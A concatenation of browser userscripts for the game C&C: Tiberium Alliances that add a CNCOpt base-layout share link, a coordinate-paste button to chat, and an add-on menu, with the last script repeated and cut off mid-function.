        "FOR_Turret_VS_Veh_ranged": "d",
        "FOR_Turret_VS_Air": "f",
        "FOR_Turret_VS_Air_ranged": "e",
        "": ""
      };

      var offense_unit_map = {
        /* GDI Offense Units */"GDI_APC Guardian": "g",
        "GDI_Commando": "c",
        "GDI_Firehawk": "f",
        "GDI_Juggernaut": "j",
        "GDI_Kodiak": "k",
        "GDI_Mammoth": "m",
        "GDI_Missile Squad": "q",
        "GDI_Orca": "o",
        "GDI_Paladin": "a",
        "GDI_Pitbull": "p",
        "GDI_Predator": "d",
        "GDI_Riflemen": "r",
        "GDI_Sniper Team": "s",
        "GDI_Zone Trooper": "z",

        /* Nod Offense Units */"NOD_Attack Bike": "b",
        "NOD_Avatar": "a",
        "NOD_Black Hand": "z",
        "NOD_Cobra": "r",
        "NOD_Commando": "c",
        "NOD_Confessor": "s",
        "NOD_Militant Rocket Soldiers": "q",
        "NOD_Militants": "m",
        "NOD_Reckoner": "k",
        "NOD_Salamander": "l",
        "NOD_Scorpion Tank": "o",
        "NOD_Specter Artilery": "p",
        "NOD_Venom": "v",
        "NOD_Vertigo": "t",
        "": ""
      };


      function findTechLayout(city) {
        for (var k in city) {
          //console.log(typeof(city[k]), "1.city[", k, "]", city[k])
          if ((typeof (city[k]) == "object") && city[k] && 0 in city[k] && 8 in city[k]) {
            if ((typeof (city[k][0]) == "object") && city[k][0] && city[k][0] && 0 in city[k][0] && 15 in city[k][0]) {
              if ((typeof (city[k][0][0]) == "object") && city[k][0][0] && "BuildingIndex" in city[k][0][0]) {
                return city[k];
              }
            }
          }
        }
        return null;
      }

      function findBuildings(city) {
        var cityBuildings = city.get_CityBuildingsData();
        for (var k in cityBuildings) {
          if (PerforceChangelist >= 376877) {
            if ((typeof (cityBuildings[k]) === "object") && cityBuildings[k] && "d" in cityBuildings[k] && "c" in cityBuildings[k] && cityBuildings[k].c > 0) {
              return cityBuildings[k].d;
            }
          } else {
            if ((typeof (cityBuildings[k]) === "object") && cityBuildings[k] && "l" in cityBuildings[k]) {
              return cityBuildings[k].l;
            }
          }
        }
      }

      function isOffenseUnit(unit) {
        return (unit.get_UnitGameData_Obj().n in offense_unit_map);
      }

      function isDefenseUnit(unit) {
        return (unit.get_UnitGameData_Obj().n in defense_unit_map);
      }

      function getUnitArrays(city) {
        var ret = [];
        for (var k in city) {
          if ((typeof (city[k]) == "object") && city[k]) {
            for (var k2 in city[k]) {
              if (PerforceChangelist >= 376877) {
                if ((typeof (city[k][k2]) == "object") && city[k][k2] && "d" in city[k][k2]) {
                  var lst = city[k][k2].d;
                  if ((typeof (lst) == "object") && lst) {
                    for (var i in lst) {
                      if (typeof (lst[i]) == "object" && lst[i] && "get_CurrentLevel" in lst[i]) {
                        ret.push(lst);
                      }
                    }
                  }
                }
              } else {
                if ((typeof (city[k][k2]) == "object") && city[k][k2] && "l" in city[k][k2]) {
                  var lst = city[k][k2].l;
                  if ((typeof (lst) == "object") && lst) {
                    for (var i in lst) {
                      if (typeof (lst[i]) == "object" && lst[i] && "get_CurrentLevel" in lst[i]) {
                        ret.push(lst);
                      }
                    }
                  }
                }
              }
            }
          }
        }
        return ret;
      }

      function getDefenseUnits(city) {
        var arr = getUnitArrays(city);
        for (var i = 0; i < arr.length; ++i) {
          for (var j in arr[i]) {
            if (isDefenseUnit(arr[i][j])) {
              return arr[i];
            }
          }
        }
        return [];
      }

      function getOffenseUnits(city) {
        var arr = getUnitArrays(city);
        for (var i = 0; i < arr.length; ++i) {
          for (var j in arr[i]) {
            if (isOffenseUnit(arr[i][j])) {
              return arr[i];
            }
          }
        }
        return [];
      }


      function cncopt_create() {
        console.log("CNCOpt Link Button v" + window.__cncopt_version + " loaded");
        var cncopt = {
          selected_base: null,
          keymap: {
            /* GDI Buildings */"GDI_Accumulator": "a",
            "GDI_Refinery": "r",
            "GDI_Trade Center": "u",
            "GDI_Silo": "s",
            "GDI_Power Plant": "p",
            "GDI_Construction Yard": "y",
            "GDI_Airport": "d",
            "GDI_Barracks": "b",
            "GDI_Factory": "f",
            "GDI_Defense HQ": "q",
            "GDI_Defense Facility": "w",
            "GDI_Command Center": "e",
            "GDI_Support_Art": "z",
            "GDI_Support_Air": "x",
            "GDI_Support_Ion": "i",
            /* Forgotten Buildings */"FOR_Silo": "s",
            "FOR_Refinery": "r",
            "FOR_Tiberium Booster": "b",
            "FOR_Crystal Booster": "v",
            "FOR_Trade Center": "u",
            "FOR_Defense Facility": "w",
            "FOR_Construction Yard": "y",
            "FOR_Harvester_Tiberium": "h",
            "FOR_Defense HQ": "q",
            "FOR_Harvester_Crystal": "n",
            /* Nod Buildings */"NOD_Refinery": "r",
            "NOD_Power Plant": "p",
            "NOD_Harvester": "h",
            "NOD_Construction Yard": "y",
            "NOD_Airport": "d",
            "NOD_Trade Center": "u",
            "NOD_Defense HQ": "q",
            "NOD_Barracks": "b",
            "NOD_Silo": "s",
            "NOD_Factory": "f",
            "NOD_Harvester_Crystal": "n",
            "NOD_Command Post": "e",
            "NOD_Support_Art": "z",
            "NOD_Support_Ion": "i",
            "NOD_Accumulator": "a",
            "NOD_Support_Air": "x",
            "NOD_Defense Facility": "w",
            //"NOD_Tech Lab": "",
            //"NOD_Recruitment Hub": "X",
            //"NOD_Temple of Nod": "X",

            /* GDI Defense Units */"GDI_Wall": "w",
            "GDI_Cannon": "c",
            "GDI_Antitank Barrier": "t",
            "GDI_Barbwire": "b",
            "GDI_Turret": "m",
            "GDI_Flak": "f",
            "GDI_Art Inf": "r",
            "GDI_Art Air": "e",
            "GDI_Art Tank": "a",
            "GDI_Def_APC Guardian": "g",
            "GDI_Def_Missile Squad": "q",
            "GDI_Def_Pitbull": "p",
            "GDI_Def_Predator": "d",
            "GDI_Def_Sniper": "s",
            "GDI_Def_Zone Trooper": "z",
            /* Nod Defense Units */"NOD_Def_Antitank Barrier": "t",
            "NOD_Def_Art Air": "e",
            "NOD_Def_Art Inf": "r",
            "NOD_Def_Art Tank": "a",
            "NOD_Def_Attack Bike": "p",
            "NOD_Def_Barbwire": "b",
            "NOD_Def_Black Hand": "z",
            "NOD_Def_Cannon": "c",
            "NOD_Def_Confessor": "s",
            "NOD_Def_Flak": "f",
            "NOD_Def_MG Nest": "m",
            "NOD_Def_Militant Rocket Soldiers": "q",
            "NOD_Def_Reckoner": "g",
            "NOD_Def_Scorpion Tank": "d",
            "NOD_Def_Wall": "w",

            /* Forgotten Defense Units */"FOR_Wall": "w",
            "FOR_Barbwire_VS_Inf": "b",
            "FOR_Barrier_VS_Veh": "t",
            "FOR_Inf_VS_Inf": "g",
            "FOR_Inf_VS_Veh": "r",
            "FOR_Inf_VS_Air": "q",
            "FOR_Sniper": "n",
            "FOR_Mammoth": "y",
            "FOR_Veh_VS_Inf": "o",
            "FOR_Veh_VS_Veh": "s",
            "FOR_Veh_VS_Air": "u",
            "FOR_Turret_VS_Inf": "m",
            "FOR_Turret_VS_Inf_ranged": "a",
            "FOR_Turret_VS_Veh": "v",
            "FOR_Turret_VS_Veh_ranged": "d",
            "FOR_Turret_VS_Air": "f",
            "FOR_Turret_VS_Air_ranged": "e",

            /* GDI Offense Units */"GDI_APC Guardian": "g",
            "GDI_Commando": "c",
            "GDI_Firehawk": "f",
            "GDI_Juggernaut": "j",
            "GDI_Kodiak": "k",
            "GDI_Mammoth": "m",
            "GDI_Missile Squad": "q",
            "GDI_Orca": "o",
            "GDI_Paladin": "a",
            "GDI_Pitbull": "p",
            "GDI_Predator": "d",
            "GDI_Riflemen": "r",
            "GDI_Sniper Team": "s",
            "GDI_Zone Trooper": "z",

            /* Nod Offense Units */"NOD_Attack Bike": "b",
            "NOD_Avatar": "a",
            "NOD_Black Hand": "z",
            "NOD_Cobra": "r",
            "NOD_Commando": "c",
            "NOD_Confessor": "s",
            "NOD_Militant Rocket Soldiers": "q",
            "NOD_Militants": "m",
            "NOD_Reckoner": "k",
            "NOD_Salamander": "l",
            "NOD_Scorpion Tank": "o",
            "NOD_Specter Artilery": "p",
            "NOD_Venom": "v",
            "NOD_Vertigo": "t",

            "<last>": "."
          },
          make_sharelink: function () {
            try {
              var selected_base = cncopt.selected_base;
              var city_id = selected_base.get_Id();
              var city = ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(city_id);
              var own_city = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity();
              var alliance = ClientLib.Data.MainData.GetInstance().get_Alliance();
              tbase = selected_base;
              tcity = city;
              scity = own_city;
              //console.log("Target City: ", city);
              //console.log("Own City: ", own_city);
              var link = "http://cncopt.com/?map=";
              link += "3|"; /* link version */
              switch (city.get_CityFaction()) {
                case 1:
                  /* GDI */
                  link += "G|";
                  break;
                case 2:
                  /* NOD */
                  link += "N|";
                  break;
                case 3:
                  /* FOR faction - unseen, but in GAMEDATA */
                case 4:
                  /* Forgotten Bases */
                case 5:
                  /* Forgotten Camps */
                case 6:
                  /* Forgotten Outposts */
                  link += "F|";
                  break;
                default:
                  console.log("cncopt: Unknown faction: " + city.get_CityFaction());
                  link += "E|";
                  break;
              }
              switch (own_city.get_CityFaction()) {
                case 1:
                  /* GDI */
                  link += "G|";
                  break;
                case 2:
                  /* NOD */
                  link += "N|";
                  break;
                case 3:
                  /* FOR faction - unseen, but in GAMEDATA */
                case 4:
                  /* Forgotten Bases */
                case 5:
                  /* Forgotten Camps */
                case 6:
                  /* Forgotten Outposts */
                  link += "F|";
                  break;
                default:
                  console.log("cncopt: Unknown faction: " + own_city.get_CityFaction());
                  link += "E|";
                  break;
              }
              link += city.get_Name() + "|";
              defense_units = []
              for (var i = 0; i < 20; ++i) {
                var col = [];
                for (var j = 0; j < 9; ++j) {
                  col.push(null);
                }
                defense_units.push(col)
              }
              var defense_unit_list = getDefenseUnits(city);
              if (PerforceChangelist >= 376877) {
                for (var i in defense_unit_list) {
                  var unit = defense_unit_list[i];
                  defense_units[unit.get_CoordX()][unit.get_CoordY() + 8] = unit;
                }
              } else {
                for (var i = 0; i < defense_unit_list.length; ++i) {
                  var unit = defense_unit_list[i];
                  defense_units[unit.get_CoordX()][unit.get_CoordY() + 8] = unit;
                }
              }

              offense_units = []
              for (var i = 0; i < 20; ++i) {
                var col = [];
                for (var j = 0; j < 9; ++j) {
                  col.push(null);
                }
                offense_units.push(col)
              }

              var offense_unit_list = getOffenseUnits(own_city);
              if (PerforceChangelist >= 376877) {
                for (var i in offense_unit_list) {
                  var unit = offense_unit_list[i];
                  offense_units[unit.get_CoordX()][unit.get_CoordY() + 16] = unit;
                }
              } else {
                for (var i = 0; i < offense_unit_list.length; ++i) {
                  var unit = offense_unit_list[i];
                  offense_units[unit.get_CoordX()][unit.get_CoordY() + 16] = unit;
                }
              }

              var techLayout = findTechLayout(city);
              var buildings = findBuildings(city);
              for (var i = 0; i < 20; ++i) {
                row = [];
                for (var j = 0; j < 9; ++j) {
                  var spot = i > 16 ? null : techLayout[j][i];
                  var level = 0;
                  var building = null;
                  if (spot && spot.BuildingIndex >= 0) {
                    building = buildings[spot.BuildingIndex];
                    level = building.get_CurrentLevel();
                  }
                  var defense_unit = defense_units[j][i];
                  if (defense_unit) {
                    level = defense_unit.get_CurrentLevel();
                  }
                  var offense_unit = offense_units[j][i];
                  if (offense_unit) {
                    level = offense_unit.get_CurrentLevel();
                  }
                  if (level > 1) {
                    link += level;
                  }

                  switch (i > 16 ? 0 : city.GetResourceType(j, i)) {
                    case 0:
                      if (building) {
                        var techId = building.get_MdbBuildingId();
                        if (GAMEDATA.Tech[techId].n in cncopt.keymap) {
                          link += cncopt.keymap[GAMEDATA.Tech[techId].n];
                        } else {
                          console.log("cncopt [5]: Unhandled building: " + techId, building);
                          link += ".";
                        }
                      } else if (defense_unit) {
                        if (defense_unit.get_UnitGameData_Obj().n in cncopt.keymap) {
                          link += cncopt.keymap[defense_unit.get_UnitGameData_Obj().n];
                        } else {
                          console.log("cncopt [5]: Unhandled unit: " + defense_unit.get_UnitGameData_Obj().n);
                          link += ".";
                        }
                      } else if (offense_unit) {
                        if (offense_unit.get_UnitGameData_Obj().n in cncopt.keymap) {
                          link += cncopt.keymap[offense_unit.get_UnitGameData_Obj().n];
                        } else {
                          console.log("cncopt [5]: Unhandled unit: " + offense_unit.get_UnitGameData_Obj().n);
                          link += ".";
                        }
                      } else {
                        link += ".";
                      }
                      break;
                    case 1:
                      /* Crystal */
                      if (spot.BuildingIndex < 0) link += "c";
                      else link += "n";
                      break;
                    case 2:
                      /* Tiberium */
                      if (spot.BuildingIndex < 0) link += "t";
                      else link += "h";
                      break;
                    case 4:
                      /* Woods */
                      link += "j";
                      break;
                    case 5:
                      /* Scrub */
                      link += "h";
                      break;
                    case 6:
                      /* Oil */
                      link += "l";
                      break;
                    case 7:
                      /* Swamp */
                      link += "k";
                      break;
                    default:
                      console.log("cncopt [4]: Unhandled resource type: " + city.GetResourceType(j, i));
                      link += ".";
                      break;
                  }
                }
              }
              /* Tack on our alliance bonuses */
              if (alliance && scity.get_AllianceId() == tcity.get_AllianceId()) {
                link += "|" + alliance.get_POITiberiumBonus();
                link += "|" + alliance.get_POICrystalBonus();
                link += "|" + alliance.get_POIPowerBonus();
                link += "|" + alliance.get_POIInfantryBonus();
                link += "|" + alliance.get_POIVehicleBonus();
                link += "|" + alliance.get_POIAirBonus();
                link += "|" + alliance.get_POIDefenseBonus();
              }

              //console.log(link);
              window.open(link, "_blank");
            } catch (e) {
              console.log("cncopt [1]: ", e);
            }
          }
        };
        if (!webfrontend.gui.region.RegionCityMenu.prototype.__cncopt_real_showMenu) {
          webfrontend.gui.region.RegionCityMenu.prototype.__cncopt_real_showMenu = webfrontend.gui.region.RegionCityMenu.prototype.showMenu;
        }

        var check_ct = 0;
        var check_timer = null;
        var button_enabled = 123456;
        /* Wrap showMenu so we can inject our Sharelink at the end of menus and
         * sync Base object to our cncopt.selected_base variable  */
        webfrontend.gui.region.RegionCityMenu.prototype.showMenu = function (selected_base) {
          try {
            var self = this;
            //console.log(selected_base);
            cncopt.selected_base = selected_base;
            if (this.__cncopt_initialized != 1) {
              this.__cncopt_initialized = 1;
              this.__cncopt_links = [];
              for (var i in this) {
                try {
                  if (this[i] && this[i].basename == "Composite") {
                    var link = new qx.ui.form.Button("CNCOpt", "http://cncopt.com/favicon.ico");
                    link.addListener("execute", function () {
                      var bt = qx.core.Init.getApplication();
                      bt.getBackgroundArea().closeCityInfo();
                      cncopt.make_sharelink();
                    });
                    this[i].add(link);
                    this.__cncopt_links.push(link)
                  }
                } catch (e) {
                  console.log("cncopt [2]: ", e);
                }
              }
            }
            var tf = false;
            switch (selected_base.get_VisObjectType()) {
              case ClientLib.Vis.VisObject.EObjectType.RegionCityType:
                switch (selected_base.get_Type()) {
                  case ClientLib.Vis.Region.RegionCity.ERegionCityType.Own:
                    tf = true;
                    break;
                  case ClientLib.Vis.Region.RegionCity.ERegionCityType.Alliance:
                  case ClientLib.Vis.Region.RegionCity.ERegionCityType.Enemy:
                    tf = true;
                    break;
                }
                break;
              case ClientLib.Vis.VisObject.EObjectType.RegionGhostCity:
                tf = false;
                console.log("cncopt: Ghost City selected.. ignoring because we don't know what to do here");
                break;
              case ClientLib.Vis.VisObject.EObjectType.RegionNPCBase:
                tf = true;
                break;
              case ClientLib.Vis.VisObject.EObjectType.RegionNPCCamp:
                tf = true;
                break;
            }

            var orig_tf = tf;

            function check_if_button_should_be_enabled() {
              try {
                tf = orig_tf;
                var selected_base = cncopt.selected_base;
                var still_loading = false;
                if (check_timer != null) {
                  clearTimeout(check_timer);
                }

                /* When a city is selected, the data for the city is loaded in the background.. once the 
                 * data arrives, this method is called again with these fields set, but until it does
                 * we can't actually generate the link.. so this section of the code grays out the button
                 * until the data is ready, then it'll light up. */
                if (selected_base && selected_base.get_Id) {
                  var city_id = selected_base.get_Id();
                  var city = ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(city_id);
                  //if (!city || !city.m_CityUnits || !city.m_CityUnits.m_DefenseUnits) {
                  //console.log("City", city);
                  //console.log("get_OwnerId", city.get_OwnerId());
                  if (!city || city.get_OwnerId() == 0) {
                    still_loading = true;
                    tf = false;
                  }
                } else {
                  tf = false;
                }
                if (tf != button_enabled) {
                  button_enabled = tf;
                  for (var i = 0; i < self.__cncopt_links.length; ++i) {
                    self.__cncopt_links[i].setEnabled(tf);
                  }
                }
                if (!still_loading) {
                  check_ct = 0;
                } else {
                  if (check_ct > 0) {
                    check_ct--;
                    check_timer = setTimeout(check_if_button_should_be_enabled, 100);
                  } else {
                    check_timer = null;
                  }
                }
              } catch (e) {
                console.log("cncopt [3]: ", e);
                tf = false;
              }
            }

            check_ct = 50;
            check_if_button_should_be_enabled();
          } catch (e) {
            console.log("cncopt [3]: ", e);
          }
          this.__cncopt_real_showMenu(selected_base);
        }
      }


      /* Nice load check (ripped from AmpliDude's LoU Tweak script) */
      function cnc_check_if_loaded() {
        try {
          if (typeof qx != 'undefined') {
            a = qx.core.Init.getApplication(); // application
            if (a) {
              cncopt_create();
            } else {
              window.setTimeout(cnc_check_if_loaded, 1000);
            }
          } else {
            window.setTimeout(cnc_check_if_loaded, 1000);
          }
        } catch (e) {
          if (typeof console != 'undefined') console.log(e);
          else if (window.opera) opera.postError(e);
          else GM_log(e);
        }
      }
      if (/commandandconquer\.com/i.test(document.domain)) window.setTimeout(cnc_check_if_loaded, 1000);
    }

    // injecting because we can't seem to hook into the game interface via unsafeWindow 
    //   (Ripped from AmpliDude's LoU Tweak script)
    var script_block = document.createElement("script");
    txt = cncopt_main.toString();
    script_block.innerHTML = "(" + txt + ")();";
    script_block.type = "text/javascript";
    if (/commandandconquer\.com/i.test(document.domain)) document.getElementsByTagName("head")[0].appendChild(script_block);
  })();
} catch (e) {
  GM_log(e);
}




// ==UserScript== 
// @name        C&C:Tiberium Alliances Coords Button - All 
// @namespace   CNCTACoordsButtonAll 
// @description Copy & Paste selected world object coords to chat message 
// @include https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version     2.0.1 
// @author Bruce Doan, Chiantii 
// @updateURL   https://userscripts.org/scripts/source/167957.meta.js 
// @downloadURL https://userscripts.org/scripts/source/167957.user.js 
// ==/UserScript== 
(function () { 
  var CNCTACoordsButtonAll_main = function () { 
    try { 
      function createCoordsButton() { 
        console.log('C&C:Tiberium Alliances Coords Button All loaded.'); 
  
        /* 
        $a = qx.core.Init.getApplication(); // Application 
        $c = $a.getChat(); // ChatWindow 
        $w = $c.getChatWidget(); // ChatWidget 
        $i = $cw.getEditable(); // Input 
        $d = $i.getContentElement().getDomElement(); // Input DOM Element 
        */ 
  
        var coordsButton = { 
          selectedBase: null, 
          pasteCoords: function(){ 
            var $i = qx.core.Init.getApplication().getChat().getChatWidget().getEditable(); // Input 
            var $d = $i.getContentElement().getDomElement(); // Input DOM Element 
  
            var result = new Array(); 
            result.push($d.value.substring(0,$d.selectionStart)); // start 
  
            result.push('[coords]' + coordsButton.selectedBase.get_RawX() + ':' + coordsButton.selectedBase.get_RawY() + '[/coords]'); 
  
            result.push($d.value.substring($d.selectionEnd, $d.value.length)); // end 
  
            $i.setValue(result.join(' ')); 
          } 
        }; 
  
        if (!webfrontend.gui.region.RegionCityMenu.prototype.__coordsButton_showMenu) { 
          webfrontend.gui.region.RegionCityMenu.prototype.__coordsButton_showMenu = webfrontend.gui.region.RegionCityMenu.prototype.showMenu; 
        
          webfrontend.gui.region.RegionCityMenu.prototype.showMenu = function (selectedVisObject) { 
            coordsButton.selectedBase = selectedVisObject; 
            if (this.__coordsButton_initialized != 1) { 
              this.__coordsButton_initialized = 1; 
              this.__newComposite = new qx.ui.container.Composite(new qx.ui.layout.VBox(0)).set({ 
                padding: 2 
              }); 
              for(i in this) { 
                if(this[i] && this[i].basename == "Composite") { 
                  var button = new qx.ui.form.Button("Paste Coords"); 
                  button.addListener("execute", function () { 
                    coordsButton.pasteCoords(); 
                  });             
                  this[i].add(button); 
                } 
              } 
            } 
            this.__coordsButton_showMenu(selectedVisObject); 
            switch (selectedVisObject.get_VisObjectType()) { 
              case ClientLib.Vis.VisObject.EObjectType.RegionPointOfInterest: 
              case ClientLib.Vis.VisObject.EObjectType.RegionRuin: 
              case ClientLib.Vis.VisObject.EObjectType.RegionHubControl: 
              case ClientLib.Vis.VisObject.EObjectType.RegionHubServer: 
                this.add(this.__newComposite); 
                break; 
            } 
          } 
        } 
      }     
    } catch (e) { 
      console.log("createCoordsButton: ", e); 
    } 
  
    function CNCTACoordsButtonAll_checkIfLoaded() { 
      try { 
        if (typeof qx !== 'undefined') { 
          createCoordsButton(); 
        } else { 
          window.setTimeout(CNCTACoordsButtonAll_checkIfLoaded, 1000); 
        } 
      } catch (e) { 
        console.log("CNCTACoordsButtonAll_checkIfLoaded: ", e); 
      } 
    } 
  window.setTimeout(CNCTACoordsButtonAll_checkIfLoaded, 1000); 
  }; 
  try { 
    var CNCTACoordsButtonAll = document.createElement("script"); 
    CNCTACoordsButtonAll.innerHTML = "(" + CNCTACoordsButtonAll_main.toString() + ")();"; 
    CNCTACoordsButtonAll.type = "text/javascript"; 
    document.getElementsByTagName("head")[0].appendChild(CNCTACoordsButtonAll); 
  } catch (e) { 
    console.log("CNCTACoordsButtonAll: init error: ", e); 
  } 
})();




// ==UserScript== 
// @name        C&C:TA Dev AddonMainMenu 
// @namespace   http*://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @description C&C:Tiberium Alliances Dev AddonMainMenu (AMM) 
// @include     http*://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version     0.2 
// @author      BlinDManX 
// @grant       none 
// @copyright   2012+, Claus Neumann 
// @license     CC BY-NC-ND 3.0 - http://creativecommons.org/licenses/by-nc-nd/3.0/ 
// ==/UserScript== 
(function () { 
	var AMMinnerHTML = function () { 
		function AMM() { 
			qx.Class.define("Addons.AddonMainMenu",{ 
				type : "singleton", 
				extend : qx.core.Object, 
				construct: function () { 				 
					this.mainMenuContent = new qx.ui.menu.Menu(); 
					this.mainMenuButton = new qx.ui.form.MenuButton("Addons", null , this.mainMenuContent); 
					this.mainMenuButton.set({ 
						width : 80, 
						appearance : "button-bar-right", 
						toolTipText : "List of AddonCommands" 
					}); 
					var mainBar = qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_MENU); 
                    var childs = mainBar.getChildren()[1].getChildren(); 
                     
                    for( var z = childs.length - 1; z>=0;z--){	                        
						if( typeof childs[z].setAppearance === "function"){							 
							if( childs[z].getAppearance() == "button-bar-right"){ 
								childs[z].setAppearance("button-bar-center"); 
							} 
						} 
                    } 
					 
					mainBar.getChildren()[1].add(this.mainMenuButton);					 
					mainBar.getChildren()[0].setScale(true); //kosmetik 
					mainBar.getChildren()[0].setWidth(764 + 80 );	//kosmetik				 
					//console.log("Button added"); 
                    Addons_AddonMainMenu = "loaded"; 
				}, 
				members : 
				{ 
					mainMenuContent : null, 
					mainMenuButton : null, 
					AddMainMenu: function (name,command,key) { 
						if(name == null){ 
							console.log("Addons.AddonMainMenu.AddSubMenu: name empty"); 
							return; 
						} 
						if(command == null){ 
							console.log("Addons.AddonMainMenu.AddMainMenu: command empty"); 
							return; 
						} 
						if(key != null){ 
							var newCommand = new qx.ui.core.Command(key); 
							newCommand.addListener("execute", command); 
							var button = new qx.ui.menu.Button(name, null, newCommand); 
						} else { 
							var button = new qx.ui.menu.Button(name); 
							button.addListener("execute", command); 
						} 
						 
						this.mainMenuContent.add(button); 
						 
					}, 
					AddSubMainMenu: function (name) {	 
						if(name == null){ 
							console.log("Addons.AddonMainMenu.AddSubMainMenu: name empty"); 
							return; 
						}					 
						var subMenu = new qx.ui.menu.Menu; 
						var button = new qx.ui.menu.Button(name, null, null, subMenu); 
						this.mainMenuContent.add(button); 
						return subMenu; 
					}, 
					AddSubMenu: function (subMenu,name,command,key) {		 
						if(name == null){ 
							console.log("Addons.AddonMainMenu.AddSubMenu: name empty"); 
							return; 
						} 
						if(command == null){ 
							console.log("Addons.AddonMainMenu.AddSubMenu: command empty"); 
							return; 
						}						 
						if(subMenu == null){ 
							console.log("Addons.AddonMainMenu.AddSubMenu: subMenu empty"); 
							return; 
						} 
						 
						if(key != null){ 
							var newCommand = new qx.ui.core.Command(key); 
							newCommand.addListener("execute", command); 
							var button = new qx.ui.menu.Button(name, null, newCommand); 
						} else { 
							var button = new qx.ui.menu.Button(name); 
							button.addListener("execute", command); 
						}						 
						subMenu.add(button); 
						 
						 
						 
						 
						var subMenu = new qx.ui.menu.Menu; 
						var actionsButton = new qx.ui.menu.Button(name, null, null, subMenu); 
						return subMenu; 
					} 
				} 
			}); 
            Addons.AddonMainMenu.getInstance(); 
             
			//-----TESTING------ 
			//var addonmenu  = Addons.AddonMainMenu.getInstance();		 
			//addonmenu.AddMainMenu("TestMainButton",function(){debugfunction("1");},"ALT+J"); 
			//--SUBMENUS-- 
			//var submenu = addonmenu.AddSubMainMenu("TestSubMenu"); 
			//addonmenu.AddSubMenu(submenu,"TestSubButton 1",function(){debugfunction("2");},"ALT+L"); 
			//addonmenu.AddSubMenu(submenu,"TestSubButton 2",function(){debugfunction("3");}); 
			//addonmenu.AddSubMenu(submenu,"TestSubButton 3",function(){debugfunction("4");}); 
			 
			//function debugfunction(k){ 
            	//console.log("working key:" + k); 
			//} 
		} 
		 
		 
		 
		function AMM_checkIfLoaded() { 
			try { 
				if (typeof qx != 'undefined' && qx.core.Init.getApplication() && qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_NAVIGATION) && qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_NAVIGATION).isVisible()) { 
					AMM(); 
				} else { 
					window.setTimeout(AMM_checkIfLoaded, 1000); 
				} 
			} catch (e) { 
				console.log("AMM_checkIfLoaded: ", e); 
			} 
		} 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			window.setTimeout(AMM_checkIfLoaded, 1000); 
            Addons_AddonMainMenu = "install"; 
		} 
	} 
	try { 
		var AMMS = document.createElement("script"); 
		AMMS.innerHTML = "(" + AMMinnerHTML.toString() + ")();"; 
		AMMS.type = "text/javascript"; 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			document.getElementsByTagName("head")[0].appendChild(AMMS); 
		} 
	} catch (e) { 
		console.log("AMMinnerHTML init error: ", e); 
	} 
})();




// ==UserScript== 
// @name        C&C:TA Dev AddonMainMenu 
// @namespace   http*://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @description C&C:Tiberium Alliances Dev AddonMainMenu (AMM) 
// @include     http*://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version     0.2 
// @author      BlinDManX 
// @grant       none 
// @copyright   2012+, Claus Neumann 
// @license     CC BY-NC-ND 3.0 - http://creativecommons.org/licenses/by-nc-nd/3.0/ 
// ==/UserScript== 
(function () { 
	var AMMinnerHTML = function () { 
		function AMM() { 
			qx.Class.define("Addons.AddonMainMenu",{ 
				type : "singleton", 
				extend : qx.core.Object, 
				construct: function () { 				 
					this.mainMenuContent = new qx.ui.menu.Menu(); 
					this.mainMenuButton = new qx.ui.form.MenuButton("Addons", null , this.mainMenuContent); 
					this.mainMenuButton.set({ 
						width : 80, 
						appearance : "button-bar-right", 
						toolTipText : "List of AddonCommands" 
					}); 
					var mainBar = qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_MENU); 
                    var childs = mainBar.getChildren()[1].getChildren(); 
                     
                    for( var z = childs.length - 1; z>=0;z--){	                        
						if( typeof childs[z].setAppearance === "function"){							 
							if( childs[z].getAppearance() == "button-bar-right"){ 
								childs[z].setAppearance("button-bar-center"); 
							} 
						} 
                    } 
					 
					mainBar.getChildren()[1].add(this.mainMenuButton);					 
					mainBar.getChildren()[0].setScale(true); //kosmetik 
					mainBar.getChildren()[0].setWidth(764 + 80 );	//kosmetik				 
					//console.log("Button added"); 
                    Addons_AddonMainMenu = "loaded"; 
				}, 
				members : 
				{ 
					mainMenuContent : null, 
					mainMenuButton : null, 
					AddMainMenu: function (name,command,key) { 
						if(name == null){ 
							console.log("Addons.AddonMainMenu.AddSubMenu: name empty"); 
							return; 
						} 
						if(command == null){ 
							console.log("Addons.AddonMainMenu.AddMainMenu: command empty"); 
							return; 
						} 
						if(key != null){ 
							var newCommand = new qx.ui.core.Command(key); 
							newCommand.addListener("execute", command); 
							var button = new qx.ui.menu.Button(name, null, newCommand); 
						} else { 
							var button = new qx.ui.menu.Button(name); 
							button.addListener("execute", command); 
						} 
						 
						this.mainMenuContent.add(button); 
						 
					}, 
					AddSubMainMenu: function (name) {	 
						if(name == null){ 
							console.log("Addons.AddonMainMenu.AddSubMainMenu: name empty"); 
							return; 
						}					 
						var subMenu = new qx.ui.menu.Menu; 
						var button = new qx.ui.menu.Button(name, null, null, subMenu); 
						this.mainMenuContent.add(button); 
						return subMenu; 
					}, 
					AddSubMenu: function (subMenu,name,command,key) {		 
						if(name == null){ 
							console.log("Addons.AddonMainMenu.AddSubMenu: name empty"); 
							return; 
						} 
						if(command == null){ 
							console.log("Addons.AddonMainMenu.AddSubMenu: command empty"); 
							return; 
						}						 
						if(subMenu == null){ 
							console.log("Addons.AddonMainMenu.AddSubMenu: subMenu empty"); 
							return; 
						} 
						 
						if(key != null){ 
							var newCommand = new qx.ui.core.Command(key); 
							newCommand.addListener("execute", command); 
							var button = new qx.ui.menu.Button(name, null, newCommand); 
						} else { 
							var button = new qx.ui.menu.Button(name); 
							button.addListener("execute", command); 
						}						 
						subMenu.add(button); 
						 
						 
						 
						 
						var subMenu = new qx.ui.menu.Menu; 
						var actionsButton = new qx.ui.menu.Button(name, null, null, subMenu); 
						return subMenu; 
					} 
				} 
			}); 
            Addons.AddonMainMenu.getInstance(); 
             
			//-----TESTING------ 
